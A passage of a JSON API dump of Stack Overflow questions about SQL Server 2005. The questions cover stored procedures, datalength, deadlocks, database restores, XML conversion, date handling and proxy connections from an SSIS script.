&lt;&gt; ca.referteamid2 AND tn2.isactive = 1 AND tn2.groupid = 18\n----AND (ca.asggrp1 &lt;&gt; ca.asggrp2 UNLESS ca.asggrp1 = 'CLIENT' AND ca.asggrp2 = 'CLIENT')\n ORDER BY DestinationTeam\n</code></pre>\n"},{"tags":["sql-server-2005","openquery"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":388,"score":0,"question_id":10409783,"title":"How MySQL Select OpenQuery Not In Statement","body":"<p>Below statement will return values from OpenQuery(MYSQL). </p>\n\n<pre><code>Select * From OpenQuery(MYSQL, 'Select * From ResearchRpt') a\nWhere Not Exists (Select * From dbo.ResearchRpt where Id_report = a.Id_report)\n</code></pre>\n\n<p>I want to reversed it where the result values should be came dbo.ResearchRpt </p>\n\n<p>Thank.</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":807,"score":0,"question_id":10986149,"title":"Passing multiple rows of data to a stored procedure","body":"<p>I have a list of objects (created from several text files) in C#.net that I need to store in a SQL2005 database file.  Unfortunately, Table-Valued Parameters began with SQL2008 so they won't help. I found from MSDN that one method is to \"Bundle multiple data values into delimited strings or XML documents and then pass those text values to a procedure or statement\" but I am rather new to stored procedures and need more help than that.  I know I could create a stored procedure to create one record then loop through my list and add them, but that's what I'm trying to avoid.  Thanks.</p>\n\n<pre><code>Input file example (Other files contain pricing and availability):\nMatnr   ShortDescription    LongDescription ManufPartNo Manufacturer    ManufacturerGlobalDescr GTIN    ProdFamilyID    ProdFamily  ProdClassID ProdClass   ProdSubClassID  ProdSubClass    ArticleCreationDate CNETavailable   CNETid  ListPrice   Weight  Length  Width   Heigth  NoReturn    MayRequireAuthorization EndUserInformation  FreightPolicyException\n10000000    A&amp;D ENGINEERING SMALL ADULT CUFF FOR UA-767PBT  UA-279  A&amp;D ENGINEERING A&amp;D ENG 093764011542    GENERAL General TDINTERNL   TD Internal TDINTERNL   TD Internal 2012-05-13 12:18:43 N       18.000  .350                N   N   N   N\n10000001    A&amp;D ENGINEERING MEDIUM ADULT CUFF FOR UA-767PBT UA-280  A&amp;D ENGINEERING A&amp;D ENG 093764046070    GENERAL General TDINTERNL   TD Internal TDINTERNL   TD Internal 2012-05-13 12:18:43 N       18.000  .450                N   N   N   N\n</code></pre>\n\n<p>Some DataBase File fields:</p>\n\n<pre><code>EffectiveDate           varchar(50)\nMfgName                 varchar(500)\nMfgPartNbr              varchar(500)\nCost                    varchar(200)\nQtyOnHand               varchar(200)\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":401,"score":0,"question_id":10986031,"title":"SQL: Dynamic view with column names based on column values in source table","body":"<p>Given the two sample tables here:</p>\n\n<p><strong>Tickets Table</strong></p>\n\n<pre><code>ID  User    Description\n\n0   James   This is a support ticket\n1   Fred    This is a ticket too\n</code></pre>\n\n<p><strong>Properties Table</strong></p>\n\n<pre><code>ID  TicketID    Label           Value\n\n0   0           Engineer        Scott\n1   1           Engineer        Dale\n2   0           Manu            Dell\n3   1           Manu            HP\n4   0           OS              Windows\n5   1           OS              Linux\n</code></pre>\n\n<p>How can I arrive at a view like this:</p>\n\n<pre><code>ID  User    Description                 Engineer    Manu    OS\n\n1   James   This is a support ticket    Scott       Dell    Windows\n2   Fred    This is a ticket too        Dale        HP      Linux\n</code></pre>\n\n<p>It is important to note that the properties table would not always be the same.  Some \"Tickets\" may have properties that others do not.</p>\n\n<p>Is this even possible?</p>\n"},{"tags":["php","sql-server","sql-server-2008","apache","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":202,"score":1,"question_id":10870710,"title":"How can I run the mssql functions in php?","body":"<p>I'm getting this annoying Fatal error: Call to undefined function mssql_connect() message.\nI've read many threads where they say just uncomment the php_mssql.dll, but there is no such file in my extension folder and it's neither listed in php.ini.\nAnd I can't seem to find it nowhere. All the links posted on forums are broken, and I'm completely broken by this.\nI also tried to download recent files from microsoft, I unpacked this one: php_pdo_sqlsrv_54_ts.dll, and written it in the extensions list but I still get the same error.\nIs there any meaningful way one can do this? Or maybe I need to reinstall php? PLease advice..</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>I added the following files to the php.ini extensions:</p>\n\n<pre><code>extension=php_pdo_sqlsrv_53_nts.dll\nextension=php_pdo_sqlsrv_53_ts.dll\nextension=php_sqlsrv_53_nts.dll\nextension=php_sqlsrv_53_ts.dll\n extension=php_pdo_mssql.dll\nextension=php_pdo_odbc.dll\n</code></pre>\n\n<p>But still no luck... :(</p>\n"},{"tags":["sql","tsql","sql-server-2005","datalength"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":712,"score":0,"question_id":4865956,"title":"Using datalength(varbinary datatype) in substring","body":"<p>I am trying to select some varbinary data from TABLE(DATA varbinary(2048)) to my .NET dll without any padding. All my records are currently 64 bytes long but they may vary in the future.</p>\n\n<p>I use a stored procedure that does this: </p>\n\n<pre><code> select substring(DATA, 1, datalength(DATA)) as DATA from TABLE\n</code></pre>\n\n<p>I would expect this to work but the stream I get in my dll is 2050(2048 + 2) bytes long. </p>\n\n<p>When I hard code the value (<code>select substring(DATA, 1, 64) as DATA from TABLE</code>) it returns 66 bytes as I would expect.</p>\n\n<p>Am I missing something (obvious)?</p>\n"},{"tags":["sql-server-2005","c#-4.0","transactionscope"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":274,"score":0,"question_id":6574353,"title":"TransactionScope and deadlocks in sproc","body":"<p>I've got a <code>sproc</code> that basically goes:</p>\n\n<pre><code>begin transaction\n    SELECT\n    UPDATE\n    INSERT\ncommit transaction\n</code></pre>\n\n<p>This <code>sproc</code> is called inside a loop from two different threads in my application, both within a <code>TransactionScope</code> with default options.</p>\n\n<p>Occasionally, my application deadlocks:</p>\n\n<blockquote>\n  <p>\"Transaction (Process ID 184) was deadlocked on lock resources with another process and has been chosen as the deadlock victim. Rerun the transaction.\"</p>\n</blockquote>\n\n<p>Is there anything I can do about this? Should I use a different isolation level?</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":231,"score":0,"question_id":10982148,"title":"Unable to restore Database, Database is in use by session","body":"<p>I am using SQL Server 2005 and I am having an issue restoring my database I receive this message upon trying to restore my database.</p>\n\n<blockquote>\n  <p>Restore failed.  (Microsoft.SqlServer.Express.Smo)</p>\n  \n  <p>\"System.Data.SqlClient.SqlError: RESTORE cannot process database\n  'AMOD' because it is in use by this session. It is recommended that\n  the master database be used when performing this operation.\n  (Microsoft.SqlServer.Express.Smo)\"</p>\n</blockquote>\n\n<p>I have restarted the program I did not open any tables contained within the database and I still receive this message. I am new to SQL Server and this is my first time doing a restore. I appreciate any help provided.</p>\n"},{"tags":["xml","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":147,"score":0,"question_id":10980094,"title":"Convert string to xml in SQL Server 2005","body":"<p>I have a string that I want to convert it to XML but it is giving me an error.</p>\n\n<pre><code> &lt;error&gt;A string literal was expected&lt;error&gt;\n\nSET @xmlString = '&lt;OrgStructureRole&gt;&lt;SurveyId&gt;13&lt;/SurveyId&gt;&lt;UserName&gt;xyz13&lt;/UserName&gt;&lt;UserName&gt;rmn456&lt;/UserName&gt;&lt;Rule OrgTreeID=131705&gt;&lt;/Rule&gt;&lt;Rule OrgTreeID=131721&gt;&lt;/Rule&gt;&lt;/OrgStructureRole&gt;'\n</code></pre>\n\n<p>I am trying to convert this by using this way.</p>\n\n<pre><code>SELECT  convert(xml,@xmlString)\n</code></pre>\n\n<p>Any suggestions?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":102,"score":2,"question_id":10924991,"title":"When taking the date only from datetime - Which is best and why?","body":"<p>So there's some disagreement at my work recently about which is the best way to take the month from <code>getdate()</code> (or alternatively from a datetime column).</p>\n\n<p>There are two ways I know of that are fairly standard for doing this:</p>\n\n<p><strong>Method #1:</strong></p>\n\n<pre><code>select DateAdd(Day, 0, DateDiff(Day, 0, Getdate())) \n</code></pre>\n\n<p>And <strong>Method #2:</strong></p>\n\n<pre><code>select Cast(Floor(Cast(Getdate() as Float)) as Datetime) \n</code></pre>\n\n<p>I'm a big fan of method #2 as I find it much easier to internalize as well as being (slightly) faster. However, I've been told that method #1 is the standard way of doing this. My question is why? Which of these two would I be best served having as the method for taking a month from a date in my arsenal and why?</p>\n"},{"tags":["xml","vb.net","sql-server-2005","ssis","script"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":374,"score":0,"question_id":6597025,"title":"connect to website through proxy in vb.net script in SSIS","body":"<p>I am trying to write an SSIS package that connect to an XML feed to download FX rates and import them into an SQL table.</p>\n\n<p>i have the code below, but cannot figure out how to implement logging in through a proxy. </p>\n\n<p>if anyone can think of an easier way to do the above, i'm more than willing to give it a try. </p>\n\n<pre><code>Imports System\nImports System.Data\nImports System.Math\nImports Microsoft.SqlServer.Dts.Runtime\nImports System.Xml\nImports System.Net\n\n\n\nPublic Class ScriptMain\n\nPublic Sub Main()\n\n\n    Dim xmlDoc As XmlDataDocument, strXML As String\n    Dim client As System.Net.WebClient = New System.Net.WebClient()\n\n    Dim cr As New System.Net.NetworkCredential(\"user\", \"password\")\n    Dim pr As New System.Net.WebProxy(\"proxy\", 8080)\n\n    pr.Credentials = cr\n    client.Proxy = pr\n\n    xmlDoc = New XmlDataDocument\n    xmlDoc.Load(\"http://themoneyconverter.com/GBP/rss.xml\")\n    strXML = CType(xmlDoc.InnerXml, String)\n    Dts.Variables(\"strXMLData\").Value = strXML\n    Dts.TaskResult = Dts.Results.Success\nEnd Sub\n\nEnd Class\n</code></pre>\n\n<p>Many thanks. </p>\n"},{"tags":["sql-server","sql-server-2005","datalength"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2282,"score":2,"question_id":558102,"title":"In SQL Server 2005, what is the difference between len() and datalength()?","body":"<p>What is the difference between len() and datalength() in SQL Server 2005?</p>\n"},{"tags":["sql-server","sql-server-2005","datalength"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":611,"score":2,"question_id":768320,"title":"Difference between sp_spaceused and DataLength SQL Server","body":"<p>I have a table with single Row when i use SP_SpaceUsed N'&lt;TableName&gt;' it gives me data as 16 KB</p>\n\n<p>and when I use dataLength something like this:-</p>\n\n<pre>\nselect ClientID , \n(0 + isnull(datalength(ClientID), 1) + \nisnull(datalength(LeadID), 1) + \nisnull(datalength(Company_Name), 1) + \nisnull(datalength(Website), 1) + \nisnull(datalength(EmployeeCount), 1) + \nisnull(datalength(Revenue), 1) +\n isnull(datalength(Address), 1) + \nisnull(datalength(City), 1) + \nisnull(datalength(State), 1) + \nisnull(datalength(ZipCode), 1) + \nisnull(datalength(CountryID), 1) + \nisnull(datalength(Phone), 1) + \nisnull(datalength(Fax), 1) + \nisnull(datalength(TimeZone), 1) + \nisnull(datalength(SicNo), 1) + \nisnull(datalength(SicDesc), 1) +\n isnull(datalength(ResearchAnalysis), 1) + \nisnull(datalength(SourceID), 1) + \nisnull(datalength(BasketID), 1) + \nisnull(datalength(PipelineStatusID), 1) + \nisnull(datalength(SurveryID), 1) + \nisnull(datalength(NextCallDt), 1) + \nisnull(datalength(CurrentRecStatus), 1) +\n isnull(datalength(AssignedUserID), 1) + \nisnull(datalength(AssignedDate), 1) + \nisnull(datalength(TotValueAmt), 1) + \nisnull(datalength(Remove), 1) + \nisnull(datalength(Release), 1) + \nisnull(datalength(LegendID), 1) + \nisnull(datalength(Inserted_Date), 1) +\n isnull(datalength(Inserted_By), 1) + \nisnull(datalength(Updated_Date), 1) + \nisnull(datalength(Updated_By), 1)) \nas rowsize from TempLeadHeader order by rowsize desc\n\n</pre>\n\n<p>it gives rowsize 167 i guess this is in bytes</p>\n\n<p>I would like to know why this difference is coming up in the result</p>\n\n<p>Thanks in advance</p>\n"}]}
{"total":14387,"page":18,"pagesize":100,"questions":[{"tags":["sql-server","sql-server-2005","backup"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":10977218,"title":"Partial backup in SQL Server","body":"<p>For debugging purpose, oftenly I need to copy the entire database from live server to local server.</p>\n\n<p>Is there any tools available in SQL Server 2005 so that I can synchorize only needed tables, or a number of records from a table.</p>\n\n<p>I can connect to the server using SLQ Server Management Studio.</p>\n"},{"tags":["sql-server","database","sql-server-2005","sql-server-2008"],"answer_count":4,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":1355,"score":0,"question_id":5884222,"title":"SET NOCOUNT ON brings back messages in SQL Server Management Studio","body":"<p>I have the following stored procedure:</p>\n\n<pre><code>ALTER PROCEDURE [dbo].[spTitle_GetTitleById]\n(\n   @TitleId INT\n)\n\nAS\n\nBEGIN\n\n   SET NOCOUNT ON;\n\n   SELECT\n      Id,\n      Name,\n      Active\n   FROM\n      Title\n   WHERE\n      Id = @TitleId\n\nEND\n</code></pre>\n\n<p>I was told to use <code>SET NOCOUNT ON;</code> if I don't want messages to be returned.  I ran this stored procedure through SQL Server Management Studio 2008 and I got the following message:</p>\n\n<pre><code>(1 row(s) affected)\n</code></pre>\n\n<p>This is still a message.  One of our DBAs said that this will be the case, but when it is run through an application it will not return any messages.  Is there a way that I can test to see if messages were returned or not when I use <code>SET NOCOUNT ON;</code>  I don't want to assume, I want to know.</p>\n\n<p>I right clicked the stored procedure and selected Execute Stored Procedure...  I then set it to OFF, and I got:</p>\n\n<pre><code>(1 row(s) affected)\n(1 row(s) affected)\n</code></pre>\n\n<p>So setting it to ON or OFF it still brought back messages in the Messages tab in the results panel.</p>\n\n<p>Just another question, when will it be wise (in what scenarios) to use <code>SET NOCOUNT OFF;</code>?</p>\n"},{"tags":["sql-server-2005","virtual-machine"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":157,"score":0,"question_id":10944479,"title":"Unable to connect to SQL Server 2005 installed on Win7 virtual machine","body":"<p>I am not able to connect to a SQL Server 2005 hosted on a Win7 virtual machine. I am new to VM, can someone help me locate the problem?</p>\n\n<p>I am able to connect another SQL server which is installed on the local machine.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":10968422,"title":"Fetch a row which has the maximum value for a column","body":"<p>I have the following table :</p>\n\n<pre><code>TNO : can be duplicate\nCNo : can be duplicate\n</code></pre>\n\n<p>I need to select the maximum Tno against the CNo from Table A where a.RNO=B.RNO</p>\n\n<p><strong>Table A</strong></p>\n\n<pre><code>Tno  Rno  name   desc\n100  200  adam   aadddddd\n100  200  adam   aadddddd\n101  201  king   aasdfdsf\n</code></pre>\n\n<p><strong>Table B</strong></p>\n\n<pre><code>Cno  Rno  \n101  200\n</code></pre>\n\n<p>Can you guys advise the best method please.</p>\n\n<p>I tried the following but not much success</p>\n\n<p>Hi,</p>\n\n<p>Please see the sample data as reqeusted: so the query should </p>\n\n<pre><code>Actual Data :\n\nRowum   cno     Tno     Rno  \n1   24908   24047   22021\n1   24909   22424   22022\n1   20438   22426   22023\n</code></pre>\n\n<p><strong>Required Data</strong> : it should display the maximun tno against Cno </p>\n\n<pre><code>Rowum   cno     Tno     Rno  \n1   24908   24047   22021    \n1   20438   22426   22023\n</code></pre>\n"},{"tags":["sql","sql-server","vb.net","sql-server-2005","tsql"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":934,"score":2,"question_id":531535,"title":"How to create several stored procedure using SQL","body":"<p>I have a vb.net function that creates several Stored Procedures based on parameters being passed into the function.</p>\n\n<p>I want to move this vb.Net into a single SQL file (for maintenance reasons) but I am not sure how I can re-create it in SQL without creating 7 separate stored procedures.</p>\n\n<p>I create a total of 20 Stored Procedures and I don't really want to create this many in a SQL file as maintenance will be a nightmare.  I am wondering if there is a solution similar to how I have done it VB.Net below:</p>\n\n<pre><code>Private Sub CreateStoredProcedures()\n\n        CreateSP(\"SummaryNone\", \"YEAR([sale].[DateTime])\")\n        CreateSP(\"SummaryUser\", \"[sale].[User]\")\n        CreateSP(\"Summarysale\", \"[sale].[sale]\")\n        CreateSP(\"SummaryBatch\", \"[sale].[Batch]\")\n        CreateSP(\"SummaryDay\", \"dbo.FormatDateTime([sale].[DateTime], 'yyyy-mm-dd')\")\n        CreateSP(\"SummaryMonth\", \"dbo.FormatDateTime(dbo.DateSerial(YEAR([sale].[DateTime]), MONTH([sale].[DateTime]), 1), 'yyyy-mm-dd')\")\n        CreateSP(\"SummaryYear\", \"Year([sale].[DateTime])\")\n\n        Return\n    End Sub\n\n\n    Private Sub CreateSP(ByVal vName As String, ByVal vGroup As String)\n\n        Dim CommandText As String = _\n                        \"CREATE PROCEDURE \" &amp; vName _\n                        &amp; \" @StartDate varchar(50),\" _\n                        &amp; \" @EndDate varchar(50)\" _\n                        &amp; \" AS \" _\n                        &amp; \" SELECT \" &amp; vGroup &amp; \"                   AS GroupField,\" _\n                        &amp; \" Sum([Project].[NumProject])                AS TotalProject,\" _\n                        &amp; \" Sum([Project].[Title])                  AS SumTitle,\" _\n                        &amp; \" Sum([Project].[Duration])               AS SumDuration,\" _\n                        &amp; \" Sum([Project].[Info])                AS SumInfo,\" _\n                        &amp; \" Sum([Customer].[NumCustomer]) AS TotalNumCustomer,\" _\n                        &amp; \" Sum([Orders].[NumOrders])   AS TotalNumOrders,\" _\n                        &amp; \" Sum([OrderInspection].[NumInspects])          AS TotalNumInspects,\" _\n                        &amp; \" Sum([OrderInspection].[NumFails])             AS TotalNumFails,\" _\n                        &amp; \" Sum([CustomerInspection].[NumInspects])    AS TotalNumCustomerInspectionInspects,\" _\n                        &amp; \" Sum([CustomerInspection].[NumFails])       AS TotalNumCustomerInspectionFails,\" _\n                        &amp; \" Sum([Measurements].[NumMeasurements]) AS TotalNumMeasurementss\" _\n                        &amp; \" FROM ((((((sale LEFT JOIN Project   ON [sale].[saleId]=[Project].[saleId])\" _\n                            &amp; \" LEFT JOIN Customer   ON [Project].[PrintId]=[Customer].[PrintId])\" _\n                            &amp; \" LEFT JOIN Orders    ON [Project].[PrintId]=[Orders].[PrintId])\" _\n                            &amp; \" LEFT JOIN OrderInspection       ON [Project].[PrintId]=[OrderInspection].[PrintId])\" _\n                            &amp; \" LEFT JOIN CustomerInspection ON [Project].[PrintId]=[CustomerInspection].[PrintId])\" _\n                            &amp; \" LEFT JOIN Measurements ON [Project].[PrintId]=[Measurements].[PrintId])\" _\n                        &amp; \" WHERE [sale].[DateTime] BETWEEN dbo.FormatDateTime((@StartDate), 'yyyy-mm-dd')\" _\n                        &amp; \" AND dbo.FormatDateTime((@Enddate),'yyyy-mm-dd')\" _\n                        &amp; \" GROUP BY \" &amp; vGroup &amp; \"\" _\n                        &amp; \" ORDER BY \" &amp; vGroup &amp; \";\"\n\n        SqlExecuteNonQuery(CommandText)\n\n        return\n    End Sub\n</code></pre>\n\n<p>I look forward to your comments and replies. </p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":9631801,"title":"Way to react on deleting any row from table in sql server 2005","body":"<p>In our database we have many tables (of course). There is one table in our database say files. This table has the list of all the files related to each table like people, contacts etc. Now there is one column (parent record) in  files table that store parent record key (not foreign key in database level because it is not possible that same column has relation to multiple tables) to either people or contacts. Now i want to create something at database level at one place which see we have deleted row from people, so delete all the rows from contacts. </p>\n\n<ol>\n<li>One way to create trigger on each table but we have hundreds of tables.</li>\n<li>We cannot use cascade delete, because relation is not of foreign key.</li>\n</ol>\n\n<p>We cannot change the structure of table as we got existing data. </p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":10962248,"title":"What is \"MISCELLANEOUS\" in sys.dm_os_wait_stats?","body":"<p>Checking <code>sys.dm_os_wait_stats</code> looks like this for me:</p>\n\n<p><img src=\"http://i.stack.imgur.com/w9V8I.png\" alt=\"enter image description here\"></p>\n\n<p><strong>What does <code>MISCELLANEOUS</code> mean?</strong> The <a href=\"http://msdn.microsoft.com/en-us/library/ms179984.aspx\" rel=\"nofollow\">docs</a> don't say anything. The wait stats had just been cleared. <code>MISCELLANEOUS</code> is increasing steadily over time.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":10,"favorite_count":3,"up_vote_count":7,"down_vote_count":0,"view_count":12985,"score":7,"question_id":677484,"title":"Very large tables in SQL Server","body":"<p>We have a very large table (> 77M records and growing) runing on SQL Server 2005 64bit Standard edition and we are seeing some performance issues. There are up to a hundred thousand records added daily.</p>\n\n<p>Does anyone know if there is a limit to the number of records SQL server Standard edition can handle? Should be be considering moving to Enterprise edition or are there some tricks we can use?</p>\n\n<p>Additional info:</p>\n\n<p>The table in question is pretty flat (14 columns), there is a clustered index with 6 fields, and two other indexes on single fields.</p>\n\n<p>We added a fourth index using 3 fields that were in a select in one problem query and did not see any difference in the estimated performance (the query is part of a process that has to run in the off hours so we don't have metrics yet). These fields are part of the clustered index.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","random","newid"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":238,"score":1,"question_id":3560162,"title":"Sql Server 2005: Today's random records","body":"<p>I can easily get a random record with this:</p>\n\n<pre><code>SELECT *    FROM MyTable    ORDER BY NewId() \n</code></pre>\n\n<p>I can easily get a record with \"today's date\" with this:</p>\n\n<pre><code>SELECT *    FROM MyTable    WHERE MyDate = \"2010-24-08\"  -- db doesn't store times\n</code></pre>\n\n<p>But how would I combind the two?</p>\n\n<p>Get 1 random record... anything with today's date.</p>\n\n<p>If none are found... get 1 random record from yesterday (today-1).</p>\n\n<p>If none are found... get 1 random record from etc, etc, today-2</p>\n\n<p>... until 1 record is found.</p>\n"},{"tags":["asp.net","sql-server-2005","visual-studio-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":402,"score":0,"question_id":1335116,"title":"How to insert values into database?","body":"<p>I have taken some text field and abd some labels and one submit and one reset button. I want to code like: when i enter some values in text boxes and click upon submit my record will get submitted into the database. And when i click upon reset then my form will get reset.</p>\n\n<p>Please let me know how will i code this scenario.</p>\n\n<p>Thanks,</p>\n\n<p>Ashish</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":271,"score":0,"question_id":10953081,"title":"Cannot find data type date in SQL Server 2005","body":"<p>I am getting this error message while creating table with one of the column has data type as date</p>\n\n<blockquote>\n  <p>Msg 2715, Level 16, State 7, Line 2<br>\n  Column, parameter, or variable #11: Cannot find data type date.</p>\n</blockquote>\n\n<p>I have also tried to change the compatibility level </p>\n\n<pre><code>alter database test\nset compatibility_level = 90\ngo\n</code></pre>\n\n<p>and received an error message </p>\n\n<pre><code>Msg 102, Level 15, State 1, Line 2  \nIncorrect syntax near '90'. \n</code></pre>\n"},{"tags":["sql","sql-server-2005","reporting-services","report"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":365,"score":0,"question_id":10856422,"title":"SQL Reporting Services 2005 Display default time of midnight to user using DateSerial Function","body":"<p>Im currently working on a report in SQL 2005 and am pretty new to reports. I am using a \"Start Date\" and \"End Date\" for a user to select a reporting period.</p>\n\n<p>For my \"Start Date\" I am using a Report Parameter \"Default\" value of:</p>\n\n<blockquote>\n  <p>=DateSerial(Year(Today()),Month(Today()),Day(Today()))</p>\n</blockquote>\n\n<p>For my \"End Date\" I am using a ReportParameter Defulat value of:</p>\n\n<blockquote>\n  <p>=Now()</p>\n</blockquote>\n\n<p>The user is displayed the following:</p>\n\n<ul>\n<li>Start Date: 06/01/2012 </li>\n<li>End Date: 01/01/2012 12:33:03</li>\n</ul>\n\n<p><strong>PROBLEM:</strong>\n- I would like to DISPLAY the default time from the DateSerial function to the user (which is defaulted to midnight 00:00:00). Im just curious if this is possible in SQL 2005.</p>\n"},{"tags":["query","sql-server-2005","search"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":281,"score":0,"question_id":10954438,"title":"SQL QUERY SEARCH EACH WORDS, SPLIT SPACE","body":"<p>question for sql server query.</p>\n\n<p>I try to create a query for searching every word on a sendence. words are split by a space.</p>\n\n<p>The result contain lines that the value contain every word not at least 1.</p>\n\n<p>sample:</p>\n\n<pre><code>DECLARE @DATATABLE TABLE (ID INT,COL1 VARCHAR(MAX))\nINSERT INTO @DATATABLE (ID,COL1) VALUES (1,'ALPHA')\nINSERT INTO @DATATABLE (ID,COL1) VALUES (2,'ALPHA BETA')\nINSERT INTO @DATATABLE (ID,COL1) VALUES (3,'ALPHA BETA CHARLIE')\nINSERT INTO @DATATABLE (ID,COL1) VALUES (4,'ALPHA BETA CHARLIE DELTA')\n\nDECLARE @TESTTABLE AS TABLE (ID INT,COL1 VARCHAR(MAX))\n\nINSERT INTO @TESTTABLE (ID,COL1) VALUES (1,'ALPHA')             -- RETURN 1,2,3,4\nINSERT INTO @TESTTABLE (ID,COL1) VALUES (2,'ALPHA BETA')            -- RETURN 2,3,4\nINSERT INTO @TESTTABLE (ID,COL1) VALUES (3,'BETA CHARLIE ALPHA')    -- RETURN 3,4\nINSERT INTO @TESTTABLE (ID,COL1) VALUES (4,'BETA DELTA')            -- RETURN 4\nINSERT INTO @TESTTABLE (ID,COL1) VALUES (5,'CHARLIE')           -- RETURN 3,4\n\nSELECT * FROM @DATATABLE\n\nDECLARE @I AS INT\nSET @I = 1\n\nDECLARE @COUNTLINE AS INT\nSET @COUNTLINE = (SELECT MAX(ID) FROM @TESTTABLE )\n\nDECLARE @CURRENTVALUE AS VARCHAR(MAX)\n\nWHILE(@I &lt;=  @COUNTLINE)\nBEGIN\n\n    SET @CURRENTVALUE = (SELECT COL1 FROM @DATATABLE WHERE ID = @I)\n\n    --  **  TODO    **\n    -- QUERY SHOULD RETURN EVERY LINE CONTAINING EACH WORD OF THE CURRENT TEST VALUE\n    SELECT * FROM @DATATABLE WHERE COL1 LIKE @CURRENTVALUE\n\n    SET @I = @I + 1\nEND\n</code></pre>\n\n<p>I write \"TODO\" where I put the first test (saw what that shouldn't do).</p>\n\n<p>I cant create SP or Function.</p>\n\n<p>I look on my side for \"with\" and \"in\" or something else.</p>\n\n<p>tank for any tips</p>\n\n<p>and good week end</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":40,"score":2,"question_id":10953729,"title":"Do I need to re-optimize views & procedures after changing the number of server cores","body":"<p>A server running SQL Server 2005 was converted into a virtual machine.  The original server had 16 logical cores.  The new virtual server only has 4 cores, but is supposed to be faster.</p>\n\n<p>Some stored procedures (that may call views or UDFs) are taking longer to run.  This could be due to less parallelism.  But, could the query plans still be optimized for 16 cores or do they automatically re-optimize after a hardware change?  </p>\n\n<p>If I need to force all plans to be recalculated, what is the best way?  Other thoughts? </p>\n"},{"tags":["c#","sql-server-2008","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":180,"score":2,"question_id":10953848,"title":"Split strings or XML to send IDs to a stored procedure?","body":"<p>I have an application in C#, and have to send a list of IDs (int) to my db in SQL Server to make a couple of  joins. I have the list of IDs in a Dataset on memory.</p>\n\n<p>I know two ways to do it: One, is to create a string with the id's separated by pipes, and split them in sql, inserting them in a temp table. Then I can do the joins that I want.</p>\n\n<p>The other way, is do \"getXML\" to my Dataset, and send it. Then, I can insert the info in a temp table, and do the joins that I want.</p>\n\n<p>Which way is better, and why? Or another option better than both?</p>\n\n<p>The number of IDs to pass are variable, using SQL Server 2005 and SQL Server 2008, Visual Studio 2010.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":10951692,"title":"Sql Server transform a select row into multiple rows base on time values","body":"<p>Please look the following query:</p>\n\n<pre><code>SELECT ID, START, END FROM TABLEA\n</code></pre>\n\n<p>the result is:</p>\n\n<pre><code>ID       START                      END\n1        2012-06-07 19:32:00        2012-06-08 06:00:00\n2        2012-06-08 06:00:00        NULL\n</code></pre>\n\n<p>But I want really a result like this:</p>\n\n<pre><code>START                      END\n2012-06-07 19:32:00        2012-06-07 23:59:59\n2012-06-08 00:00:00        NULL\n</code></pre>\n\n<p>The id no matters.</p>\n\n<p>And look at this example:</p>\n\n<pre><code> ID       START                      END\n    1        2012-06-06 19:32:00        2012-06-08 06:00:00\n    2        2012-06-08 06:00:00        NULL\n</code></pre>\n\n<p>It Must be:</p>\n\n<pre><code>        START                      END\n        2012-06-06 19:32:00        2012-06-06 23:59:59\n        2012-06-07 00:00:00        2012-06-07 23:59:59\n        2012-06-08 00:00:00        NULL\n</code></pre>\n\n<p>The idea is to generate rows with the start and end values within the same day.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":55,"score":2,"question_id":10946018,"title":"Return all tables and views used in stored procedure","body":"<p>I am using SQL Server 2005</p>\n\n<p>I want to see what tables and views are used in a stored procedure by only giving the stored 